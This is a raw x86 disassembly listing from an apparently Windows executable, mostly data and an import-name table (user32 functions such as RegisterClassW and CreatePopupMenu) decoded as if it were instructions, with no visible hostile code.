  41250d:	add    BYTE PTR [eax],al
  41250f:	add    BYTE PTR [eax],al
  412511:	add    BYTE PTR [eax],al
  412513:	add    BYTE PTR [eax],bh
  412515:	aaa    
  412516:	add    DWORD PTR [eax],eax
  412518:	push   eax
  412519:	and    eax,DWORD PTR [ecx]
  41251b:	add    ah,al
  41251d:	sub    BYTE PTR [ecx],al
	...
  412527:	add    BYTE PTR [edx],bl
  412529:	cmp    al,BYTE PTR [ecx]
  41252b:	add    BYTE PTR [ebx+eiz*1+0x1],ch
  41252f:	add    BYTE PTR [eax+0x29],bh
  412532:	add    DWORD PTR [eax],eax
	...
  41253c:	cmp    bh,BYTE PTR [edx]
  41253e:	add    DWORD PTR [eax],eax
  412540:	and    BYTE PTR [ecx+eax*1],ah
	...
  412557:	add    BYTE PTR [eax-0x6dfffed7],al
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    BYTE PTR [edx-0x4ffffed7],ah
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    BYTE PTR [esi-0x2bfffed7],bh
  41256d:	sub    DWORD PTR [ecx],eax
  41256f:	add    ah,ah
  412571:	sub    DWORD PTR [ecx],eax
  412573:	add    dh,dh
  412575:	sub    DWORD PTR [ecx],eax
  412577:	add    BYTE PTR [edx],al
  412579:	sub    al,BYTE PTR [ecx]
  41257b:	add    BYTE PTR [edx+ebp*1],dl
  41257e:	add    DWORD PTR [eax],eax
  412580:	and    BYTE PTR [edx],ch
  412582:	add    DWORD PTR [eax],eax
  412584:	sub    al,BYTE PTR cs:[ecx]
  412587:	add    BYTE PTR [esi+0x2a],al
  41258a:	add    DWORD PTR [eax],eax
  41258c:	pop    eax
  41258d:	sub    al,BYTE PTR [ecx]
  41258f:	add    BYTE PTR [esi+0x2a],ah
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	mov    gs,WORD PTR [edx]
  41259a:	add    DWORD PTR [eax],eax
  41259c:	sahf   
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [edx-0x35fffed6],dh
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    dh,bl
  4125a9:	sub    al,BYTE PTR [ecx]
  4125ab:	add    dl,ch
  4125ad:	sub    al,BYTE PTR [ecx]
  4125af:	add    ah,bh
  4125b1:	sub    al,BYTE PTR [ecx]
  4125b3:	add    BYTE PTR [edx],dl
  4125b5:	sub    eax,DWORD PTR [ecx]
  4125b7:	add    BYTE PTR [esi],bl
  4125b9:	sub    eax,DWORD PTR [ecx]
  4125bb:	add    BYTE PTR [ebx+ebp*1],ch
  4125be:	add    DWORD PTR [eax],eax
  4125c0:	inc    eax
  4125c1:	sub    eax,DWORD PTR [ecx]
  4125c3:	add    BYTE PTR [esi+0x2b],cl
  4125c6:	add    DWORD PTR [eax],eax
  4125c8:	sub    eax,DWORD PTR fs:[ecx]
  4125cb:	add    BYTE PTR [edx+0x2b],dh
  4125ce:	add    DWORD PTR [eax],eax
  4125d0:	test   BYTE PTR [ebx],ch
  4125d2:	add    DWORD PTR [eax],eax
  4125d4:	mov    gs,WORD PTR [ebx]
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	sahf   
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [eax-0x3bfffed5],bh
  4125e1:	sub    eax,DWORD PTR [ecx]
  4125e3:	add    al,dl
  4125e5:	sub    eax,DWORD PTR [ecx]
  4125e7:	add    ah,ch
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    ah,bh
  4125ed:	sub    eax,DWORD PTR [ecx]
  4125ef:	add    BYTE PTR [edx],cl
  4125f1:	sub    al,0x1
  4125f3:	add    BYTE PTR [eax],bl
  4125f5:	sub    al,0x1
  4125f7:	add    BYTE PTR [esp+ebp*1],ah
  4125fa:	add    DWORD PTR [eax],eax
  4125fc:	cmp    BYTE PTR [ecx+eax*1],ch
  4125ff:	add    BYTE PTR [esi+0x2c],cl
  412602:	add    DWORD PTR [eax],eax
  412604:	pop    edx
  412605:	sub    al,0x1
  412607:	add    BYTE PTR [edx+0x2c],ch
  41260a:	add    DWORD PTR [eax],eax
  41260c:	jl     0x41263a
  41260e:	add    DWORD PTR [eax],eax
  412610:	mov    gs,WORD PTR [ecx+eax*1]
  412613:	add    BYTE PTR [eax-0x47fffed4],ah
  412619:	sub    al,0x1
  41261b:	add    al,cl
  41261d:	sub    al,0x1
  41261f:	add    dh,dl
  412621:	sub    al,0x1
  412623:	add    ah,ah
  412625:	sub    al,0x1
  412627:	add    dh,dh
  412629:	sub    al,0x1
  41262b:	add    BYTE PTR [esi],al
  41262d:	sub    eax,0x2d140001
  412632:	add    DWORD PTR [eax],eax
  412634:	es sub eax,0x2d3c0001
  41263a:	add    DWORD PTR [eax],eax
  41263c:	dec    edx
  41263d:	sub    eax,0x2d5a0001
  412642:	add    DWORD PTR [eax],eax
  412644:	push   0x2d
  412646:	add    DWORD PTR [eax],eax
  412648:	je     0x412677
  41264a:	add    DWORD PTR [eax],eax
  41264c:	test   BYTE PTR ds:0x2d900001,ch
  412652:	add    DWORD PTR [eax],eax
  412654:	sahf   
  412655:	sub    eax,0x2daa0001
  41265a:	add    DWORD PTR [eax],eax
  41265c:	mov    eax,0xd000012d
  412661:	sub    eax,0x2dde0001
  412666:	add    DWORD PTR [eax],eax
  412668:	out    dx,al
  412669:	sub    eax,0x2dfe0001
  41266e:	add    DWORD PTR [eax],eax
  412670:	or     al,0x2e
  412672:	add    DWORD PTR [eax],eax
  412674:	push   ds
  412675:	add    DWORD PTR cs:[eax],eax
  412678:	xor    ch,BYTE PTR [esi]
  41267a:	add    DWORD PTR [eax],eax
  41267c:	dec    esi
  41267d:	add    DWORD PTR cs:[eax],eax
  412680:	pop    esi
  412681:	add    DWORD PTR cs:[eax],eax
  412684:	je     0x4126b4
  412686:	add    DWORD PTR [eax],eax
  412688:	xchg   BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	call   0x12e:0xac00012e
  412693:	add    BYTE PTR [esi-0x33fffed2],bh
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	fisubr DWORD PTR [esi]
  41269e:	add    DWORD PTR [eax],eax
  4126a0:	out    dx,al
  4126a1:	add    DWORD PTR cs:[eax],eax
  4126a4:	cli    
  4126a5:	add    DWORD PTR cs:[eax],eax
  4126a8:	push   cs
  4126a9:	das    
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	push   ds
  4126ad:	das    
  4126ae:	add    DWORD PTR [eax],eax
  4126b0:	cs das 
  4126b2:	add    DWORD PTR [eax],eax
  4126b4:	inc    eax
  4126b5:	das    
  4126b6:	add    DWORD PTR [eax],eax
  4126b8:	pop    eax
  4126b9:	das    
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	outs   dx,BYTE PTR ds:[esi]
  4126bd:	das    
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	jle    0x4126f1
  4126c2:	add    DWORD PTR [eax],eax
  4126c4:	call   0x12f:0xae00012f
  4126cb:	add    BYTE PTR [edx-0x39fffed1],bh
  4126d1:	das    
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	aam    0x2f
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	in     al,0x2f
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	cli    
  4126dd:	das    
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	or     al,0x30
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	push   ss
  4126e5:	xor    BYTE PTR [ecx],al
  4126e7:	add    BYTE PTR [esi],ch
  4126e9:	xor    BYTE PTR [ecx],al
  4126eb:	add    BYTE PTR [edx],bh
  4126ed:	xor    BYTE PTR [ecx],al
  4126ef:	add    BYTE PTR [eax+esi*1+0x1],cl
  4126f3:	add    BYTE PTR [eax+0x30],bl
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	jb     0x41272a
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	jle    0x41272e
  4126fe:	add    DWORD PTR [eax],eax
  412700:	mov    WORD PTR [eax],?
  412702:	add    DWORD PTR [eax],eax
  412704:	mov    ds:0xb8000130,al
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [eax],al
  41270d:	add    BYTE PTR [eax],al
  41270f:	add    ah,dl
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    al,ch
  412715:	xor    BYTE PTR [ecx],al
  412717:	add    BYTE PTR [eax],al
  412719:	xor    DWORD PTR [ecx],eax
  41271b:	add    BYTE PTR [esi],dl
  41271d:	xor    DWORD PTR [ecx],eax
  41271f:	add    BYTE PTR [esi],ah
  412721:	xor    DWORD PTR [ecx],eax
  412723:	add    BYTE PTR [ecx+esi*1],dh
  412726:	add    DWORD PTR [eax],eax
  412728:	dec    esp
  412729:	xor    DWORD PTR [ecx],eax
  41272b:	add    BYTE PTR [edx+0x31],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	xor    WORD PTR [ecx],ax
  412733:	add    BYTE PTR [eax+0x31],bh
  412736:	add    DWORD PTR [eax],eax
  412738:	xchg   esp,eax
  412739:	xor    DWORD PTR [ecx],eax
  41273b:	add    BYTE PTR [edx-0x49fffecf],ah
  412741:	xor    DWORD PTR [ecx],eax
  412743:	add    dh,al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    dl,dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    ah,ah
  41274d:	xor    DWORD PTR [ecx],eax
  41274f:	add    ah,ch
  412751:	xor    DWORD PTR [ecx],eax
  412753:	add    ah,bh
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [esi],cl
  412759:	xor    al,BYTE PTR [ecx]
  41275b:	add    BYTE PTR [edx+esi*1],bl
  41275e:	add    DWORD PTR [eax],eax
  412760:	xor    al,BYTE PTR cs:[ecx]
  412763:	add    BYTE PTR [eax+0x32],al
  412766:	add    DWORD PTR [eax],eax
  412768:	push   esi
  412769:	xor    al,BYTE PTR [ecx]
  41276b:	add    BYTE PTR [esi+0x32],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	js     0x4127a4
  412772:	add    DWORD PTR [eax],eax
  412774:	mov    dh,BYTE PTR [edx]
  412776:	add    DWORD PTR [eax],eax
  412778:	call   0x132:0xb0000132
  41277f:	add    al,al
  412781:	xor    al,BYTE PTR [ecx]
  412783:	add    ah,cl
  412785:	xor    al,BYTE PTR [ecx]
  412787:	add    dl,ah
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    ah,dh
  41278d:	xor    al,BYTE PTR [ecx]
  41278f:	add    BYTE PTR [esi],al
  412791:	xor    eax,DWORD PTR [ecx]
  412793:	add    BYTE PTR [esi],dl
  412795:	xor    eax,DWORD PTR [ecx]
  412797:	add    BYTE PTR [ebx+esi*1],ch
  41279a:	add    DWORD PTR [eax],eax
  41279c:	cmp    dh,BYTE PTR [ebx]
  41279e:	add    DWORD PTR [eax],eax
  4127a0:	push   eax
  4127a1:	xor    eax,DWORD PTR [ecx]
  4127a3:	add    BYTE PTR [ebx+esi*1+0x1],ah
  4127a7:	add    BYTE PTR [edx+0x33],bh
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cwde   
  4127ad:	xor    eax,DWORD PTR [ecx]
  4127af:	add    BYTE PTR [eax-0x43fffecd],dh
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    dh,cl
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    dl,bl
  4127bd:	xor    eax,DWORD PTR [ecx]
  4127bf:	add    dh,ch
  4127c1:	xor    eax,DWORD PTR [ecx]
  4127c3:	add    BYTE PTR [esi],al
  4127c5:	xor    al,0x1
  4127c7:	add    BYTE PTR [edx],dl
  4127c9:	xor    al,0x1
  4127cb:	add    BYTE PTR [eax],ah
  4127cd:	xor    al,0x1
  4127cf:	add    BYTE PTR [edx],dh
  4127d1:	xor    al,0x1
  4127d3:	add    BYTE PTR [edx+0x34],al
  4127d6:	add    DWORD PTR [eax],eax
  4127d8:	dec    esp
  4127d9:	xor    al,0x1
  4127db:	add    BYTE PTR [eax],al
  4127dd:	add    BYTE PTR [eax],al
  4127df:	add    BYTE PTR [esi+0x34],ah
  4127e2:	add    DWORD PTR [eax],eax
  4127e4:	je     0x41281a
  4127e6:	add    DWORD PTR [eax],eax
  4127e8:	xor    BYTE PTR [ecx+eax*1],0x0
  4127ec:	xchg   esp,eax
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [eax],al
  4127f1:	add    BYTE PTR [eax],al
  4127f3:	add    BYTE PTR [esi-0x43fffecc],ch
  4127f9:	xor    al,0x1
  4127fb:	add    dh,cl
  4127fd:	xor    al,0x1
  4127ff:	add    ah,bl
  412801:	xor    al,0x1
  412803:	add    ah,ah
  412805:	xor    al,0x1
  412807:	add    ah,dh
  412809:	xor    al,0x1
  41280b:	add    BYTE PTR [eax],al
  41280d:	xor    eax,0x350e0001
  412812:	add    DWORD PTR [eax],eax
  412814:	push   ss
  412815:	xor    eax,0x35220001
  41281a:	add    DWORD PTR [eax],eax
  41281c:	sub    al,0x35
  41281e:	add    DWORD PTR [eax],eax
  412820:	ss xor eax,0x353e0001
  412826:	add    DWORD PTR [eax],eax
  412828:	dec    eax
  412829:	xor    eax,0x35520001
  41282e:	add    DWORD PTR [eax],eax
  412830:	pop    esp
  412831:	xor    eax,0x35680001
  412836:	add    DWORD PTR [eax],eax
  412838:	je     0x41286f
  41283a:	add    DWORD PTR [eax],eax
  41283c:	jle    0x412873
  41283e:	add    DWORD PTR [eax],eax
  412840:	mov    BYTE PTR ds:0x35920001,dh
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    al,ds:0xa8000135
  41284d:	xor    eax,0x35b40001
  412852:	add    DWORD PTR [eax],eax
  412854:	mov    esi,0xc8000135
  412859:	xor    eax,0x35d20001
  41285e:	add    DWORD PTR [eax],eax
  412860:	fidiv  WORD PTR ds:0x35ec0001
  412866:	add    DWORD PTR [eax],eax
  412868:	clc    
  412869:	xor    eax,0x36000001
  41286e:	add    DWORD PTR [eax],eax
  412870:	or     al,0x36
  412872:	add    DWORD PTR [eax],eax
  412874:	push   ss
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	and    BYTE PTR [esi],dh
  41287a:	add    DWORD PTR [eax],eax
  41287c:	sub    BYTE PTR [esi],dh
  41287e:	add    DWORD PTR [eax],eax
  412880:	xor    dh,BYTE PTR [esi]
  412882:	add    DWORD PTR [eax],eax
  412884:	cmp    al,0x36
  412886:	add    DWORD PTR [eax],eax
  412888:	inc    esi
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	push   eax
  41288d:	add    DWORD PTR ss:[eax],eax
  412890:	pop    edx
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	fs add DWORD PTR ss:[eax],eax
  412898:	outs   dx,BYTE PTR ds:[esi]
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	xor    BYTE PTR [esi],0x1
  41289f:	add    BYTE PTR [edx+0x136],dl
  4128a5:	add    BYTE PTR [eax],al
  4128a7:	add    BYTE PTR [eax-0x3ffffeca],ch
  4128ad:	add    DWORD PTR ss:[eax],eax
  4128b0:	fdiv   DWORD PTR [esi]
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	hlt    
  4128b5:	add    DWORD PTR ss:[eax],eax
  4128b8:	or     al,0x37
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	and    al,0x37
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	add    BYTE PTR [eax],al
  4128c2:	add    BYTE PTR [eax],al
  4128c4:	inc    esi
  4128c5:	aaa    
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	pop    esp
  4128c9:	aaa    
  4128ca:	add    DWORD PTR [eax],eax
  4128cc:	jo     0x412905
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jle    0x412909
  4128d2:	add    DWORD PTR [eax],eax
  4128d4:	mov    dh,BYTE PTR [edi]
  4128d6:	add    DWORD PTR [eax],eax
  4128d8:	cwde   
  4128d9:	aaa    
  4128da:	add    DWORD PTR [eax],eax
  4128dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128dd:	aaa    
  4128de:	add    DWORD PTR [eax],eax
  4128e0:	mov    ah,0x37
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	les    esi,FWORD PTR [edi]
  4128e6:	add    DWORD PTR [eax],eax
  4128e8:	into   
  4128e9:	aaa    
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	fidiv  DWORD PTR [edi]
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	repnz aaa 
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	push   es
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [eax],bl
  4128f9:	cmp    BYTE PTR [ecx],al
  4128fb:	add    BYTE PTR [eax],ch
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    BYTE PTR [eax+edi*1],dh
  412902:	add    DWORD PTR [eax],eax
  412904:	dec    edx
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    BYTE PTR [eax+edi*1+0x1],bl
  41290b:	add    BYTE PTR [eax+edi*1+0x1],ch
  41290f:	add    BYTE PTR [eax+edi*1+0x389a0001],al
  412916:	add    DWORD PTR [eax],eax
  412918:	stos   BYTE PTR es:[edi],al
  412919:	cmp    BYTE PTR [ecx],al
  41291b:	add    BYTE PTR [esi-0x35fffec8],dh
  412921:	cmp    BYTE PTR [ecx],al
  412923:	add    dh,bl
  412925:	cmp    BYTE PTR [ecx],al
  412927:	add    dh,ch
  412929:	cmp    BYTE PTR [ecx],al
  41292b:	add    dh,bh
  41292d:	cmp    BYTE PTR [ecx],al
  41292f:	add    BYTE PTR [esi],cl
  412931:	cmp    DWORD PTR [ecx],eax
  412933:	add    BYTE PTR [ecx+edi*1],bl
  412936:	add    DWORD PTR [eax],eax
  412938:	sub    bh,BYTE PTR [ecx]
  41293a:	add    DWORD PTR [eax],eax
  41293c:	cmp    BYTE PTR [ecx],bh
  41293e:	add    DWORD PTR [eax],eax
  412940:	inc    esp
  412941:	cmp    DWORD PTR [ecx],eax
  412943:	add    BYTE PTR [eax+0x39],bl
  412946:	add    DWORD PTR [eax],eax
  412948:	cmp    DWORD PTR fs:[ecx],eax
  41294b:	add    BYTE PTR [ecx+edi*1+0x1],dh
  41294f:	add    BYTE PTR [esi+0x39],bh
  412952:	add    DWORD PTR [eax],eax
  412954:	xchg   esp,eax
  412955:	cmp    DWORD PTR [ecx],eax
  412957:	add    BYTE PTR [esi-0x45fffec7],bl
  41295d:	cmp    DWORD PTR [ecx],eax
  41295f:	add    al,dl
  412961:	cmp    DWORD PTR [ecx],eax
  412963:	add    al,ah
  412965:	cmp    DWORD PTR [ecx],eax
  412967:	add    al,dh
  412969:	cmp    DWORD PTR [ecx],eax
  41296b:	add    ah,bh
  41296d:	cmp    DWORD PTR [ecx],eax
  41296f:	add    BYTE PTR [eax],cl
  412971:	cmp    al,BYTE PTR [ecx]
  412973:	add    BYTE PTR [eax],al
  412975:	add    BYTE PTR [eax],al
  412977:	add    BYTE PTR [edx+edi*1],ah
  41297a:	add    DWORD PTR [eax],eax
  41297c:	add    BYTE PTR [eax],al
  41297e:	add    BYTE PTR [eax],al
  412980:	add    eax,0x67655202
  412985:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  41298c:	popa   
  41298d:	jae    0x412a02
  41298f:	push   edi
  412990:	add    BYTE PTR [eax],al
  412992:	push   ebp
  412993:	add    DWORD PTR [edi+0x65],eax
  412996:	je     0x4129eb
  412998:	arpl   WORD PTR [edx+0x6f],si
  41299b:	ins    BYTE PTR es:[edi],dx
  41299c:	ins    BYTE PTR es:[edi],dx
  41299d:	push   eax
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	jae    0x4129a1
  4129a1:	add    BYTE PTR [ecx+0x616f4c01],ch
  4129a7:	fs inc edx
  4129a9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x44004170
  4129b1:	add    BYTE PTR [ebx+0x6c],al
  4129b4:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4129bb:	jb     0x4129bd
  4129bd:	add    BYTE PTR [edx+0x2],cl
  4129c0:	push   ebx
  4129c1:	gs je  0x412a11
  4129c4:	outs   dx,BYTE PTR gs:[esi]
  4129c6:	jne    0x412a0c
  4129c8:	gs popaw 
  4129cb:	jne    0x412a39
  4129cd:	je     0x412a18
  4129cf:	je     0x412a36
  4129d1:	ins    DWORD PTR es:[edi],dx
  4129d2:	add    BYTE PTR [eax],al
  4129d4:	pop    edi
  4129d5:	add    dl,BYTE PTR [ebx+0x65]
  4129d8:	je     0x412a2d
  4129da:	jns    0x412a4f
  4129dc:	inc    ebx
  4129dd:	outs   dx,DWORD PTR ds:[esi]
  4129de:	ins    BYTE PTR es:[edi],dx
  4129df:	outs   dx,DWORD PTR ds:[esi]
  4129e0:	jb     0x412a55
  4129e2:	add    BYTE PTR [eax],al
  4129e4:	mov    ds:0x57734901,eax
  4129e9:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  4129f0:	jae    0x412a5b
  4129f2:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  4129f6:	push   0x74654701
  4129fb:	push   edi
  4129fc:	imul   ebp,DWORD PTR [esi+0x64],0xa100776f
  412a03:	add    DWORD PTR [ecx+0x73],ecx
  412a06:	push   edi
  412a07:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412a0e:	popa   
  412a0f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412a13:	add    al,ch
  412a15:	add    DWORD PTR [edi+0x70],ecx
  412a18:	outs   dx,BYTE PTR gs:[esi]
  412a1a:	dec    ecx
  412a1b:	arpl   WORD PTR [edi+0x6e],bp
  412a1e:	add    BYTE PTR [eax],al
  412a20:	stos   DWORD PTR es:[edi],eax
  412a21:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412a25:	fs inc ebx
  412a27:	jne    0x412a9b
  412a29:	jae    0x412a9a
  412a2b:	jb     0x412a6e
  412a2d:	add    BYTE PTR [edx+eax*1+0x6e617254],dl
  412a34:	jae    0x412aa2
  412a36:	popa   
  412a37:	je     0x412a9e
  412a39:	inc    ecx
  412a3a:	arpl   WORD PTR [ebx+0x65],sp
  412a3d:	ins    BYTE PTR es:[edi],dx
  412a3e:	gs jb  0x412aa2
  412a41:	je     0x412ab2
  412a43:	jb     0x412a9c
  412a45:	add    BYTE PTR [ecx+0x0],ah
  412a48:	inc    ebx
  412a49:	jb     0x412ab0
  412a4b:	popa   
  412a4c:	je     0x412ab3
  412a4e:	push   eax
  412a4f:	outs   dx,DWORD PTR ds:[esi]
  412a50:	jo     0x412ac7
  412a52:	jo     0x412aa1
  412a54:	outs   dx,BYTE PTR gs:[esi]
  412a56:	jne    0x412a58
  412a58:	add    BYTE PTR ss:[ebx+0x68],al
  412a5c:	popa   
  412a5d:	jb     0x412ab4
  412a5f:	jo     0x412ad1
  412a61:	gs jb  0x412aa5
  412a64:	add    BYTE PTR [eax],al
  412a66:	mov    ds:0x57734901,al
  412a6b:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412a72:	imul   esp,DWORD PTR [ebx+0x6f],0x3b006564
  412a79:	add    DWORD PTR [edi+0x65],eax
  412a7c:	je     0x412acb
  412a7e:	gs jae 0x412af4
  412a81:	popa   
  412a82:	addr16 gs inc ebp
  412a85:	js     0x412afb
  412a87:	jb     0x412aea
  412a89:	dec    ecx
  412a8a:	outs   dx,BYTE PTR ds:[esi]
  412a8b:	outs   dx,WORD PTR ds:[esi]
  412a8d:	add    BYTE PTR [esi+0x0],al
  412a90:	inc    ebx
  412a91:	ins    BYTE PTR es:[edi],dx
  412a92:	outs   dx,DWORD PTR ds:[esi]
  412a93:	jae    0x412afa
  412a95:	inc    esp
  412a96:	gs jae 0x412b04
  412a99:	je     0x412b0a
  412a9b:	jo     0x412a9d
  412a9d:	add    cl,ch
  412a9f:	add    DWORD PTR [edi+0x70],ecx
  412aa2:	outs   dx,BYTE PTR gs:[esi]
  412aa4:	dec    ecx
  412aa5:	outs   dx,BYTE PTR ds:[esi]
  412aa6:	jo     0x412b1d
  412aa8:	je     0x412aee
  412aaa:	gs jae 0x412b18
  412aad:	je     0x412b1e
  412aaf:	jo     0x412ab1
  412ab1:	add    BYTE PTR [ebp+0x73795302],al
  412ab7:	je     0x412b1e
  412ab9:	ins    DWORD PTR es:[edi],dx
  412aba:	push   eax
  412abb:	popa   
  412abc:	jb     0x412b1f
  412abe:	ins    DWORD PTR es:[edi],dx
  412abf:	gs je  0x412b27
  412ac2:	jb     0x412b37
  412ac4:	dec    ecx
  412ac5:	outs   dx,BYTE PTR ds:[esi]
  412ac6:	outs   dx,WORD PTR ds:[esi]
  412ac8:	inc    ecx
  412ac9:	add    BYTE PTR [esi+0x2],cl
  412acc:	push   ebx
  412acd:	gs je  0x412b1d
  412ad0:	outs   dx,BYTE PTR gs:[esi]
  412ad2:	jne    0x412b1d
  412ad4:	je     0x412b3b
  412ad6:	ins    DWORD PTR es:[edi],dx
  412ad7:	dec    ecx
  412ad8:	outs   dx,BYTE PTR ds:[esi]
  412ad9:	outs   dx,WORD PTR ds:[esi]
  412adb:	push   edi
  412adc:	add    BYTE PTR [eax],al
  412ade:	adc    eax,0x6c655202
  412ae3:	gs popa 
  412ae5:	jae    0x412b4c
  412ae7:	inc    esp
  412ae8:	inc    ebx
  412ae9:	add    BYTE PTR [ecx+0x766e4901],cl
  412aef:	popa   
  412af0:	ins    BYTE PTR es:[edi],dx
  412af1:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412af9:	je     0x412afb
  412afb:	add    BYTE PTR [edx+eax*1+0x74697753],al
  412b02:	arpl   WORD PTR [eax+0x54],bp
  412b05:	outs   dx,DWORD PTR ds:[esi]
  412b06:	push   esp
  412b07:	push   0x69577369
  412b0c:	outs   dx,BYTE PTR ds:[esi]
  412b0d:	outs   dx,DWORD PTR fs:[esi]
  412b0f:	ja     0x412b11
  412b11:	add    BYTE PTR [esi+0x6c694b01],ah
  412b17:	ins    BYTE PTR es:[edi],dx
  412b18:	push   esp
  412b19:	imul   ebp,DWORD PTR [ebp+0x65],0x2bd0072
  412b20:	imul   esp,DWORD PTR [ebp+0x79],0x62
  412b24:	fs pop edi
  412b26:	gs jbe 0x412b8e
  412b29:	outs   dx,BYTE PTR ds:[esi]
  412b2a:	je     0x412b2c
  412b2c:	cmp    eax,0x65684300
  412b31:	arpl   WORD PTR [ebx+0x52],bp
  412b34:	popa   
  412b35:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  412b3d:	outs   dx,BYTE PTR ds:[esi]
  412b3e:	add    BYTE PTR [eax],al
  412b40:	sahf   
  412b41:	add    DWORD PTR [ecx+0x73],ecx
  412b44:	push   edx
  412b45:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412b4a:	jo     0x412bc0
  412b4c:	jns    0x412b4e
  412b4e:	mov    es,WORD PTR [ecx]
  412b50:	dec    ecx
  412b51:	jae    0x412b96
  412b53:	push   0x6c417261
  412b58:	jo     0x412bc2
  412b5a:	popa   
  412b5b:	dec    esi
  412b5c:	jne    0x412bcb
  412b5e:	gs jb  0x412bca
  412b61:	arpl   WORD PTR [edi+0x0],dx
  412b64:	mov    ch,0x0
  412b66:	inc    esp
  412b67:	jb     0x412bca
  412b69:	ja     0x412bb8
  412b6b:	outs   dx,BYTE PTR gs:[esi]
  412b6d:	jne    0x412bb1
  412b6f:	popa   
  412b70:	jb     0x412b72
  412b72:	mov    BYTE PTR [edx],al
  412b74:	push   esp
  412b75:	popa   
  412b76:	bound  esp,QWORD PTR [edx+0x65]
  412b79:	fs push esp
  412b7b:	gs js  0x412bf2
  412b7e:	dec    edi
  412b7f:	jne    0x412bf5
  412b81:	push   edi
  412b82:	add    BYTE PTR [eax],al
  412b84:	or     eax,DWORD PTR [ecx]
  412b86:	inc    edi
  412b87:	gs je  0x412bce
  412b8a:	inc    ebx
  412b8b:	inc    ebp
  412b8c:	js     0x412b8e
  412b8e:	jno    0x412b92
  412b90:	push   ebx
  412b91:	gs je  0x412beb
  412b94:	imul   ebp,DWORD PTR [esi+0x64],0x6752776f
  412b9b:	outs   dx,BYTE PTR ds:[esi]
  412b9c:	add    BYTE PTR [eax],al
  412b9e:	xchg   ebx,eax
  412b9f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412ba3:	je     0x412c17
  412ba5:	outs   dx,DWORD PTR ds:[esi]
  412ba6:	jns    0x412be9
  412ba8:	arpl   WORD PTR [ebx+0x65],sp
  412bab:	ins    BYTE PTR es:[edi],dx
  412bac:	gs jb  0x412c10
  412baf:	je     0x412c20
  412bb1:	jb     0x412c07
  412bb3:	popa   
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	push   edi
  412bb9:	add    dl,BYTE PTR [ebx+0x65]
  412bbc:	je     0x412c0e
  412bbe:	jb     0x412c2f
  412bc0:	jo     0x412c19
  412bc2:	add    BYTE PTR [eax],al
  412bc4:	sti    
  412bc5:	add    DWORD PTR [eax+0x74],edx
  412bc8:	dec    ecx
  412bc9:	outs   dx,BYTE PTR ds:[esi]
  412bca:	push   edx
  412bcb:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  412bd0:	push   0x74655302
  412bd5:	push   ebp
  412bd6:	jae    0x412c3d
  412bd8:	jb     0x412c29
  412bda:	bound  ebp,QWORD PTR [edx+0x65]
